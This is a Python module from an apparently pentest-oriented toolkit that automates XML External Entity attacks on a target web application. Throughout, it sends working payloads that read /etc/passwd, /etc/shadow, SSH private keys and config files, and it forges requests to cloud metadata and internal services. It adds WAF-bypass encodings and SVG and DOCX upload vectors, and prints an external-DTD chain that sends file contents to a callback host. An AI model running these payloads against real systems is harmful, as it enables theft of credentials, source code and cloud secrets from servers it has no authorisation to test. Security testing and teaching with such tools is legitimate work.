"""
modules/xxe_injection.py
XML External Entity (XXE) Injection - Detection, Exploitation & Bypass
Classic · Blind OOB · Error-based · SSRF · SVG · PHP Filter · WAF Bypass
"""
import os
import re
import shlex
import tempfile

import requests

from config.settings import OUTPUT_DIR, SESSION, add_vuln, save_session
from utils.helpers import (
    DIM,
    NEON_CYN,
    NEON_GRN,
    NEON_YEL,
    PURE_WHITE,
    RST,
    SOFT_WHITE,
    info,
    print_banner,
    prompt,
    run_cmd,
    section,
    success,
    warn,
)
from utils.http import ScopeViolation, get_client
from utils.oob import get_collaborator


def _out(name):
    d = str(OUTPUT_DIR); os.makedirs(d, exist_ok=True)
    return os.path.join(d, name)


def _target():
    url = SESSION.get("target_url", "")
    if not url:
        url = prompt("Target URL"); SESSION["target_url"] = url
    return url


def _curl_flags():
    flags = "-sk"
    cookies = SESSION.get("cookies", "")
    proxy   = SESSION.get("proxy", "")
    if cookies: flags += f" -b {shlex.quote(cookies)}"
    if proxy:   flags += f" --proxy {shlex.quote(proxy)}"
    return flags


def _run(cmd, timeout=20):
    out, err, _ = run_cmd(cmd, timeout=timeout)
    return ((out or "") + ("\n" + err if err else "")).strip() or "(no output)"


def _post_xml(url, endpoint, payload, content_type="application/xml", timeout=15):
    """POST an XML payload through the engine. Returns the response or None."""
    try:
        return get_client().post(
            url.rstrip("/") + "/" + endpoint.lstrip("/"),
            data=payload.encode("utf-8"),
            headers={"Content-Type": content_type},
            timeout=timeout,
        )
    except (requests.RequestException, ScopeViolation) as exc:
        warn(f"XML request failed: {exc}")
        return None


def _send_xml(url, endpoint, payload, content_type="application/xml", timeout=15):
    """Back-compat wrapper returning response text for callers that print it."""
    resp = _post_xml(url, endpoint, payload, content_type, timeout)
    return "(no response)" if resp is None else (resp.text or "").strip()


# ── 1. Endpoint Discovery ─────────────────────────────────────────────────────

def discover_xml_endpoints():
    section("XML ENDPOINT DISCOVERY")
    url = _target()
    cf  = _curl_flags()
    base = url.rstrip("/")

    xml_paths = [
        "/api/upload", "/upload", "/api/parse", "/api/xml", "/api/import",
        "/api/data", "/soap", "/ws", "/service", "/webservice",
        "/api/v1/import", "/api/v2/import", "/api/feed", "/api/rss",
        "/api/sync", "/api/export", "/api/convert", "/api/process",
        "/xmlrpc.php", "/xmlrpc", "/rpc", "/api/rpc",
        "/api/graphql",  # GraphQL accepts XML too sometimes
        "/sitemap.xml",  # not injectable but confirms XML parsing
        "/.well-known/security.txt",
    ]

    info(f"Probing {len(xml_paths)} paths for XML endpoints...")
    print()
    found = []
    for path in xml_paths:
        target = base + path
        # Quick HEAD check first
        code = _run(
            f"curl {cf} -o /dev/null -w '%{{http_code}}' --max-time 6 {shlex.quote(target)}",
            timeout=10,
        )
        code = code.strip()
        if code in ("200", "201", "405", "415", "500"):  # 415=wrong content-type, good sign
            found.append((path, code))
            label = f"{NEON_GRN}[{code}]{RST}" if code in ("200","201") else f"{NEON_YEL}[{code}]{RST}"
            print(f"  {label} {target}")

    # Also check response headers for XML indicators
    print(f"\n  {NEON_CYN}Checking homepage for XML acceptance headers...{RST}")
    headers_out = _run(f"curl {cf} -sI --max-time 8 {shlex.quote(base)}", timeout=12)
    if any(x in headers_out.lower() for x in ["xml", "soap", "wsdl", "application/xml"]):
        info("  Server advertises XML support in headers")

    if found:
        success(f"Found {len(found)} potentially XML-accepting endpoints")
        SESSION["_xxe_endpoints"] = [p for p, _ in found]
    else:
        warn("No XML endpoints found at common paths")
        info("Try: /api/upload with multipart, /soap/endpoint, or custom paths")

    return found


# ── 2. Classic XXE ────────────────────────────────────────────────────────────

def classic_xxe():
    section("CLASSIC XXE - FILE READ")
    url    = _target()
    cf     = _curl_flags()

    endpoint = prompt("XML endpoint (e.g. /api/parse, /upload)") or "/api/xml"

    targets = [
        ("file:///etc/passwd",                       ["root:x:", "daemon:", "/bin/bash"],     "Linux /etc/passwd"),
        ("file:///etc/hostname",                     [],                                       "/etc/hostname"),
        ("file:///etc/hosts",                        ["localhost", "127.0.0.1"],               "/etc/hosts"),
        ("file:///proc/self/environ",                ["PATH=", "HOME=", "PWD="],               "/proc/self/environ"),
        ("file:///proc/self/cmdline",                [],                                       "/proc/self/cmdline"),
        ("file:///var/www/html/index.php",           ["<?php", "html"],                        "Web root index.php"),
        ("file:///home/www-data/.ssh/id_rsa",        ["BEGIN", "PRIVATE KEY"],                 "SSH private key"),
        ("file:///c:/windows/win.ini",               ["[fonts]", "[extensions]"],              "Windows win.ini"),
        ("file:///c:/inetpub/wwwroot/web.config",   ["<configuration>", "connectionString"],  "Windows web.config"),
    ]

    content_types = ["application/xml", "text/xml", "application/json"]

    print(f"\n  {NEON_CYN}Testing {len(targets)} file targets × {len(content_types)} content-types...{RST}\n")

    confirmed = []
    for uri, indicators, label in targets:
        payload = (
            f'<?xml version="1.0" encoding="UTF-8"?>'
            f'<!DOCTYPE root [<!ENTITY xxe SYSTEM "{uri}">]>'
            f'<root><data>&xxe;</data></root>'
        )
        for ct in content_types:
            out = _send_xml(url, endpoint, payload, ct)
            if indicators and any(ind in out for ind in indicators):
                success(f"XXE CONFIRMED via {label} (Content-Type: {ct})")
                print(f"  {NEON_YEL}Evidence:{RST}\n{out[:400]}")
                add_vuln("XXE - Local File Read", "Critical", "A03:2021",
                         f"Read {uri} via XXE at {url+endpoint}", url + endpoint)
                confirmed.append((uri, label))
                break
            elif "root:x:" in out or "daemon:" in out:
                success(f"XXE CONFIRMED: {label}")
                confirmed.append((uri, label))
                break
        else:
            print(f"  {DIM}[-] {label}{RST}")
        if confirmed and uri == "file:///etc/passwd":
            break  # One confirm is enough to prove the concept

    if not confirmed:
        warn("Classic XXE not confirmed - trying alternate structures...")

        # Alternate: parameter entity
        alt_payload = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE data ['
            '  <!ENTITY % file SYSTEM "file:///etc/passwd">'
            '  <!ENTITY % eval "<!ENTITY exfil SYSTEM \'file:///etc/passwd\'>">'
            '  %eval;'
            ']>'
            '<data>&exfil;</data>'
        )
        out = _send_xml(url, endpoint, alt_payload)
        if "root:" in out:
            success("XXE via parameter entity CONFIRMED")

    return confirmed


# ── 3. Blind XXE (OOB) ───────────────────────────────────────────────────────

def blind_xxe():
    section("BLIND XXE - OUT-OF-BAND DETECTION")
    url = _target()

    oob = get_collaborator(required=True)
    if oob is None:
        warn("Blind XXE cannot be tested without a collaborator - this is UNTESTED, "
             "not clean.")
        return
    info(f"Collaborator: {oob.describe()}")

    endpoint = prompt("XML endpoint (e.g. /api/upload)") or "/api/xml"

    payloads = [
        (
            "direct",
            '<?xml version="1.0"?>'
            f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{oob.url("xxe-direct")}">]>'
            '<foo>&xxe;</foo>',
            "Direct entity OOB (HTTP)",
        ),
        (
            "param",
            '<?xml version="1.0"?>'
            f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{oob.url("xxe-param")}"> %xxe;]>'
            '<foo/>',
            "Parameter entity OOB (DNS+HTTP)",
        ),
        (
            "dns",
            '<?xml version="1.0"?>'
            f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{oob.hostname("xxe-dns")}/">]>'
            '<foo>&xxe;</foo>',
            "DNS-only OOB callback",
        ),
    ]

    sent = []
    for tag, payload, label in payloads:
        for ct in ("application/xml", "text/xml"):
            info(f"Sending: {label} ({ct})")
            resp = _post_xml(url, endpoint, payload, ct, timeout=12)
            if resp is not None:
                print(f"  HTTP {resp.status_code}: {resp.text[:200]}")
                sent.append((tag, label, resp))

    info("Waiting for callbacks...")
    confirmed = False
    for tag, label, resp in sent:
        hits = oob.wait_for(tag, timeout=20 if not confirmed else 5)
        if not hits:
            continue
        confirmed = True
        protocols = sorted({h.get("protocol", "?") for h in hits})
        origin = hits[0].get("remote-address", "unknown")
        success(f"BLIND XXE CONFIRMED via {label}: {', '.join(protocols).upper()} "
                f"from {origin}")
        add_vuln("Blind XXE (out-of-band confirmed)", "High", "A05:2021",
                 f"{label} against {endpoint} caused the XML parser to resolve an "
                 f"external entity: the collaborator recorded a {'/'.join(protocols)} "
                 f"interaction from {origin}. External entity resolution is enabled, "
                 "which also permits local file disclosure and SSRF.",
                 url.rstrip("/") + "/" + endpoint.lstrip("/"),
                 evidence=resp.evidence, confidence="Confirmed", cwe="CWE-611")
        break

    if not confirmed:
        warn("No callback received. Egress filtering and a parser that ignores the "
             f"DOCTYPE look identical from here - check {oob.domain} before closing "
             "this out as safe.")

    # Show exfiltration DTD technique
    print(f"""
  {NEON_CYN}Step 2 - Data Exfiltration via External DTD:{RST}

  1. Host this malicious.dtd on your server ({oob.url('dtd')}malicious.dtd):
  {NEON_YEL}<!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{oob.url('exfil')}?data=%file;'>">
  %eval;
  %exfil;{RST}

  2. Trigger with this payload:
  {NEON_YEL}<?xml version="1.0"?>
  <!DOCTYPE foo [<!ENTITY % remote SYSTEM "{oob.url('dtd')}malicious.dtd"> %remote;]>
  <foo/>{RST}

  3. File contents will appear as URL parameter in your listener logs.
""")

    save_result = prompt("Save blind XXE payloads to file? [y/N]")
    if save_result.lower() == "y":
        out_file = _out("xxe_blind_payloads.txt")
        with open(out_file, "w") as f:
            for payload, label in payloads:
                f.write(f"# {label}\n{payload}\n\n")
        success(f"Saved → {out_file}")


# ── 4. Error-Based XXE ────────────────────────────────────────────────────────

def error_based_xxe():
    section("ERROR-BASED XXE - FILE READ VIA ERROR MESSAGE")
    url    = _target()

    print(f"""
  {NEON_CYN}Error-based XXE:{RST}
    Trigger a parser error that includes file content in the error message.
    Works even when response body doesn't reflect entities directly.
""")
    endpoint = prompt("XML endpoint") or "/api/xml"

    # Error-based: include non-existent entity that contains file → error leaks content
    targets = ["/etc/passwd", "/etc/hostname", "/etc/shadow"]
    for target_file in targets:
        payload = (
            f'<?xml version="1.0"?>'
            f'<!DOCTYPE foo ['
            f'  <!ENTITY % file SYSTEM "file://{target_file}">'
            f'  <!ENTITY % eval "<!ENTITY % error SYSTEM \'file:///nonexistent/%file;\'>">'
            f'  %eval;'
            f'  %error;'
            f']>'
            f'<foo/>'
        )
        out = _send_xml(url, endpoint, payload)
        # Check if error message contains file content
        if "root:x:" in out or "daemon:" in out or "localhost" in out:
            success(f"ERROR-BASED XXE CONFIRMED - {target_file} leaked in error!")
            print(f"  {NEON_YEL}{out[:500]}{RST}")
            add_vuln("XXE - Error-Based File Read", "Critical", "A03:2021",
                     f"File content leaked via XML parser error at {url+endpoint}", url + endpoint)
            return
        print(f"  {DIM}[-] {target_file}: no content in error{RST}")

    info("Error-based XXE not confirmed - parser may not include file content in errors")


# ── 5. SSRF via XXE ──────────────────────────────────────────────────────────

def ssrf_xxe():
    section("SSRF VIA XXE - SERVER-SIDE REQUEST FORGERY")
    url    = _target()

    print(f"""
  {NEON_CYN}SSRF via XXE attack chain:{RST}
    1. XXE triggers internal HTTP request from the server
    2. Server fetches internal resources (metadata, internal APIs, localhost services)
    3. Response reflected back via file: or http: entity
""")
    endpoint = prompt("XML endpoint") or "/api/xml"

    ssrf_targets = [
        ("http://169.254.169.254/latest/meta-data/",          ["ami-id", "instance-id", "local-hostname"], "AWS EC2 metadata"),
        ("http://169.254.169.254/latest/meta-data/iam/",      ["security-credentials", "iam"],             "AWS IAM role"),
        ("http://metadata.google.internal/computeMetadata/v1/",["project-id", "serviceAccounts"],          "GCP metadata"),
        ("http://100.100.100.200/latest/meta-data/",           [],                                          "Alibaba Cloud metadata"),
        ("http://127.0.0.1/",                                  ["html", "server"],                          "localhost HTTP"),
        ("http://127.0.0.1:8080/",                             [],                                          "localhost:8080"),
        ("http://127.0.0.1:8443/",                             [],                                          "localhost:8443"),
        ("http://127.0.0.1:9200/",                             ["elasticsearch", "cluster_name"],           "Elasticsearch 9200"),
        ("http://127.0.0.1:6379/",                             [],                                          "Redis 6379"),
        ("http://127.0.0.1:27017/",                            [],                                          "MongoDB 27017"),
    ]

    info(f"Testing {len(ssrf_targets)} SSRF targets via XXE entity...")
    print()
    for uri, indicators, label in ssrf_targets:
        payload = (
            f'<?xml version="1.0"?>'
            f'<!DOCTYPE foo [<!ENTITY ssrf SYSTEM "{uri}">]>'
            f'<foo>&ssrf;</foo>'
        )
        out = _send_xml(url, endpoint, payload, timeout=12)
        if indicators and any(ind in out for ind in indicators):
            success(f"SSRF+XXE CONFIRMED → {label}")
            print(f"  {NEON_YEL}Response: {out[:300]}{RST}")
            add_vuln("SSRF via XXE", "Critical", "A10:2021",
                     f"Internal resource {uri} fetched via XXE entity at {url+endpoint}", url + endpoint)
        elif out and "(no output)" not in out and len(out) > 20 and "error" not in out.lower()[:50]:
            warn(f"[?] {label} → got {len(out)} bytes response - investigate manually")
        else:
            print(f"  {DIM}[-] {label}{RST}")


# ── 6. SVG & Office XXE ───────────────────────────────────────────────────────

def svg_office_xxe():
    section("SVG / OFFICE XML - XXE VIA FILE UPLOAD")
    url    = _target()
    cf     = _curl_flags()

    print(f"""
  {NEON_CYN}File upload vectors for XXE:{RST}
    - SVG images (accepted by many avatar/image upload endpoints)
    - DOCX/XLSX/PPTX (ZIP containing XML - common in document processors)
    - ODF files (LibreOffice format, XML-based)
    - XHTML / HTML files parsed as XML
""")

    upload_endpoints = SESSION.get("_xxe_endpoints", [])
    # Add common upload paths
    upload_endpoints += ["/upload", "/api/upload", "/profile/avatar", "/api/image",
                         "/documents/upload", "/api/documents", "/api/files"]
    upload_endpoints = list(dict.fromkeys(upload_endpoints))

    endpoint = prompt(f"Upload endpoint [{upload_endpoints[0] if upload_endpoints else '/upload'}]")
    if not endpoint:
        endpoint = upload_endpoints[0] if upload_endpoints else "/upload"

    # Create SVG XXE payload
    svg_payload = (
        '<?xml version="1.0" standalone="yes"?>'
        '<!DOCTYPE svg ['
        '  <!ELEMENT svg ANY>'
        '  <!ENTITY xxe SYSTEM "file:///etc/passwd">'
        ']>'
        '<svg xmlns="http://www.w3.org/2000/svg" width="128" height="128">'
        '<text>&xxe;</text>'
        '</svg>'
    )

    with tempfile.NamedTemporaryFile(suffix=".svg", delete=False, mode="w") as f:
        f.write(svg_payload)
        svg_path = f.name

    info("Uploading SVG XXE payload...")
    for field in ["file", "image", "avatar", "upload", "attachment"]:
        out = _run(
            f"curl {cf} -s --max-time 15 "
            f"-F {shlex.quote(f'{field}=@{svg_path};filename=test.svg;type=image/svg+xml')} "
            f"{shlex.quote(url.rstrip('/') + endpoint)} 2>&1",
            timeout=20,
        )
        if "root:x:" in out or "daemon:" in out:
            success(f"SVG XXE CONFIRMED via field='{field}'!")
            print(f"  {NEON_YEL}{out[:400]}{RST}")
            add_vuln("XXE via SVG Upload", "Critical", "A03:2021",
                     f"File read via SVG XXE upload at {url+endpoint}", url + endpoint)
            break
        elif out and "(no output)" not in out and len(out) > 30:
            print(f"  [?] field='{field}': got response ({len(out)} bytes) - may need further analysis")
        else:
            print(f"  {DIM}[-] field='{field}'{RST}")

    try:
        os.unlink(svg_path)
    except Exception:
        pass

    # DOCX XXE instructions
    print(f"""
  {NEON_CYN}DOCX/XLSX XXE (manual steps):{RST}
    1. Create a .docx file (ZIP containing XML)
    2. Unzip: unzip document.docx -d docx_dir
    3. Edit docx_dir/word/document.xml - add XXE DOCTYPE:
       {NEON_YEL}<?xml version="1.0"?>
       <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>{RST}
    4. Insert &xxe; inside a text element
    5. Repack: cd docx_dir && zip -r ../malicious.docx .
    6. Upload malicious.docx to document processor
    7. Check if content appears in processed output
""")


# ── 7. PHP Filter XXE ─────────────────────────────────────────────────────────

def php_filter_xxe():
    section("PHP FILTER CHAIN - XXE SOURCE CODE DISCLOSURE")
    url    = _target()

    print(f"""
  {NEON_CYN}PHP filter wrapper via XXE:{RST}
    php://filter/convert.base64-encode/resource=FILE
    Returns base64-encoded file content - bypasses binary/null byte issues.
    Works when PHP is the backend and LFI entity is allowed.
""")
    endpoint = prompt("XML endpoint") or "/api/xml"
    targets = [
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=config.php",
        "php://filter/convert.base64-encode/resource=../config.php",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://filter/read=string.rot13/resource=index.php",
    ]

    import base64 as _b64
    for target_file in targets:
        payload = (
            f'<?xml version="1.0"?>'
            f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{target_file}">]>'
            f'<foo>&xxe;</foo>'
        )
        out = _send_xml(url, endpoint, payload)
        # Check for base64 output
        b64_match = re.search(r'[A-Za-z0-9+/]{40,}={0,2}', out)
        if b64_match:
            b64 = b64_match.group(0)
            try:
                decoded = _b64.b64decode(b64 + "==").decode("utf-8", errors="replace")
                if "<?php" in decoded or "root:x:" in decoded or len(decoded) > 50:
                    success(f"PHP FILTER XXE CONFIRMED: {target_file}")
                    print(f"  {NEON_YEL}Decoded ({len(decoded)} chars):{RST}\n{decoded[:400]}")
                    add_vuln("XXE - PHP Filter Source Disclosure", "Critical", "A03:2021",
                             f"Source code of {target_file} read via XXE+PHP filter", url + endpoint)
                    continue
            except Exception:
                pass
        print(f"  {DIM}[-] {target_file}{RST}")


# ── 8. WAF Bypass Payloads ────────────────────────────────────────────────────

def waf_bypass_xxe():
    section("XXE WAF BYPASS TECHNIQUES")
    url    = _target()

    print(f"""
  {NEON_CYN}WAF Bypass Variants:{RST}
""")
    endpoint = prompt("XML endpoint") or "/api/xml"

    bypass_payloads = [
        (
            # UTF-16 encoding
            '<?xml version="1.0" encoding="UTF-16"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<foo>&xxe;</foo>',
            "UTF-16 encoded XML",
        ),
        (
            # Hex-encoded SYSTEM
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "&#x66;&#x69;&#x6C;&#x65;:///etc/passwd">]>'
            '<foo>&xxe;</foo>',
            "Hex entity-encoded SYSTEM URI",
        ),
        (
            # Nested entity
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo [<!ENTITY a "fi"><!ENTITY b "le"><!ENTITY xxe SYSTEM "&a;&b;:///etc/passwd">]>'
            '<foo>&xxe;</foo>',
            "Nested entity composition",
        ),
        (
            # CDATA exfil
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<foo><![CDATA[&xxe;]]></foo>',
            "CDATA section wrapping",
        ),
        (
            # No XML declaration
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<foo>&xxe;</foo>',
            "No XML declaration (parser may be more lenient)",
        ),
        (
            # Whitespace in DOCTYPE
            '<?xml version="1.0"?>'
            '<!  DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<foo>&xxe;</foo>',
            "Whitespace in DOCTYPE keyword",
        ),
    ]

    for payload, label in bypass_payloads:
        print(f"\n  {NEON_CYN}[*]{RST} {label}")
        out = _send_xml(url, endpoint, payload)
        if "root:x:" in out or "daemon:" in out or "bin/bash" in out:
            success(f"WAF BYPASS XXE CONFIRMED: {label}")
            print(f"  {NEON_YEL}{out[:300]}{RST}")
            add_vuln("XXE WAF Bypass", "Critical", "A03:2021",
                     f"WAF bypassed via {label} at {url+endpoint}", url + endpoint)
        else:
            print(f"  {DIM}Response: {out[:100]}{RST}")

        # Try alternate content-types as WAF bypass
        for ct in ["text/xml", "application/xhtml+xml", "application/rss+xml"]:
            out2 = _send_xml(url, endpoint, bypass_payloads[0][0], ct)
            if "root:x:" in out2:
                success(f"WAF bypassed via Content-Type: {ct}")
                break


# ── 9. Full Auto Scan ─────────────────────────────────────────────────────────

def auto_xxe_scan():
    section("AUTOMATED XXE SCAN")
    url    = _target()
    cf     = _curl_flags()
    base   = url.rstrip("/")

    info("Phase 1: Discovering XML endpoints...")
    found_eps = discover_xml_endpoints()

    endpoints = SESSION.get("_xxe_endpoints", [])
    if not endpoints:
        endpoints = ["/api/xml", "/api/upload", "/upload", "/soap"]
    info(f"Testing {len(endpoints)} endpoints...")

    confirmed = []
    for ep in endpoints[:10]:
        ep_url = base + ep if not ep.startswith("http") else ep
        info(f"\nPhase 2: Classic XXE → {ep}")

        # Quick test with most common payload
        payload = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<foo>&xxe;</foo>'
        )
        for ct in ["application/xml", "text/xml"]:
            out = _run(
                f"curl {cf} -s --max-time 12 "
                f"-X POST "
                f"-H {shlex.quote(f'Content-Type: {ct}')} "
                f"-d {shlex.quote(payload)} "
                f"{shlex.quote(ep_url)} 2>&1",
                timeout=18,
            )
            if "root:x:" in out or "daemon:" in out:
                success(f"XXE CONFIRMED at {ep} (Content-Type: {ct})")
                confirmed.append(ep)
                add_vuln("XXE - File Read", "Critical", "A03:2021",
                         f"/etc/passwd readable via XXE at {ep_url}", ep_url)
                break

    if confirmed:
        success(f"\n{len(confirmed)} vulnerable endpoint(s): {confirmed}")
    else:
        info("\nNo XXE confirmed automatically - try manual techniques:")
        info("  [3] Error-based XXE  [4] Blind OOB  [5] SVG upload  [6] PHP filters")


# ── Menu ──────────────────────────────────────────────────────────────────────

def run():
    print_banner("XXE INJECTION", "XML External Entity - File Read · SSRF · Blind OOB · SVG · WAF Bypass")
    while True:
        url = SESSION.get("target_url", "-")
        print(f"""
  {NEON_GRN}Target:{RST} {PURE_WHITE}{url}{RST}

  {NEON_CYN}[1]{RST} Endpoint Discovery     {SOFT_WHITE}(find XML-consuming endpoints){RST}
  {NEON_CYN}[2]{RST} Classic XXE            {SOFT_WHITE}(file:// read → /etc/passwd · win.ini · config){RST}
  {NEON_CYN}[3]{RST} Error-Based XXE        {SOFT_WHITE}(file content leaked in parser error messages){RST}
  {NEON_CYN}[4]{RST} Blind XXE (OOB)        {SOFT_WHITE}(DNS/HTTP callback · exfil DTD chain){RST}
  {NEON_CYN}[5]{RST} SSRF via XXE           {SOFT_WHITE}(AWS/GCP metadata · localhost ports · Redis){RST}
  {NEON_CYN}[6]{RST} SVG / Office XXE       {SOFT_WHITE}(file upload → SVG/DOCX XXE payload){RST}
  {NEON_CYN}[7]{RST} PHP Filter XXE         {SOFT_WHITE}(base64 source code disclosure){RST}
  {NEON_CYN}[8]{RST} WAF Bypass Variants    {SOFT_WHITE}(UTF-16 · hex entities · CDATA · content-type){RST}
  {NEON_CYN}[A]{RST} Auto Scan              {SOFT_WHITE}(discover endpoints + run all classic XXE tests){RST}
  {NEON_GRN}[0]{RST} Back to main menu
""")
        c = prompt("Choice")
        if c == "0":    break
        elif c == "1":  discover_xml_endpoints()
        elif c == "2":  classic_xxe()
        elif c == "3":  error_based_xxe()
        elif c == "4":  blind_xxe()
        elif c == "5":  ssrf_xxe()
        elif c == "6":  svg_office_xxe()
        elif c == "7":  php_filter_xxe()
        elif c == "8":  waf_bypass_xxe()
        elif c.upper() == "A": auto_xxe_scan()
        save_session()
